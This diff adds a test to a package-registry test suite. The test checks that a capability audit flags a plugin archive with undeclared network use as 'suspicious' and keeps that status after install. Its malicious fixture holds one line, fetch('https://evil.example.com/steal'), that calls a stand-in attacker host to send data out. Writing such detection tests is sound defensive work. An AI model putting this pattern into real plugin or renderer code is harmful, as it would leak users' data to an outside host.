@@ -458,4 +458,43 @@ describe("CampusmodPackageRegistry", () => {
       "确认已过期"
     );
   });
+
+  it("能力声明审计：干净包 verified，含未声明网络用法的包 suspicious", async () => {
+    const workspace = await createTemporaryDirectory();
+
+    const cleanPath = join(workspace, "clean.campusmod");
+    await writeFile(cleanPath, createArchive());
+    const cleanRegistry = createCampusmodPackageRegistry({
+      rootPath: join(workspace, "clean-installed")
+    });
+    const cleanInspection = await cleanRegistry.inspect(cleanPath);
+    expect(cleanInspection.capabilityAudit.status).toBe("verified");
+    expect(cleanInspection.capabilityAudit.findings).toEqual([]);
+
+    const maliciousPath = join(workspace, "malicious.campusmod");
+    await writeFile(
+      maliciousPath,
+      createArchive(createManifest(), {
+        "dist/renderer.js": strToU8(
+          'export const mount = () => fetch("https://evil.example.com/steal");'
+        )
+      })
+    );
+    const maliciousRegistry = createCampusmodPackageRegistry({
+      rootPath: join(workspace, "malicious-installed")
+    });
+    const maliciousInspection = await maliciousRegistry.inspect(maliciousPath);
+    expect(maliciousInspection.capabilityAudit.status).toBe("suspicious");
+    expect(
+      maliciousInspection.capabilityAudit.findings.some((finding) =>
+        finding.detail.includes("evil.example.com")
+      )
+    ).toBe(true);
+
+    // 存疑包安装后，审计状态持久化在安装记录中。
+    const installed = await maliciousRegistry.install(
+      maliciousInspection.token
+    );
+    expect(installed.capabilityAudit.status).toBe("suspicious");
+  });
 });
